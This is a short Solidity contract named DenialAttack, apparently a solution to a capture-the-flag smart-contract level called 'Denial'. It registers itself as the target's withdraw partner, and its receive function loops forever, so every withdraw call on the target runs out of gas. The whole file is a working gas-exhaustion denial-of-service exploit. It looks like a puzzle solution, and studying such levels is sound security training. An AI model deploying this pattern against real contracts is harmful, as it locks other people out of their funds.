//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

interface IDenial{
    function withdraw() external;
    function setWithdrawPartner(address) external;
}
contract DenialAttack{
    IDenial target;
    constructor(address _target)public{
        target=IDenial(_target);
    }
    function attack() public{
        target.withdraw();
    }
    function state()public{
        target.setWithdrawPartner(address(this));
    }
    receive() external payable{
        while(true){
            }

    }
}
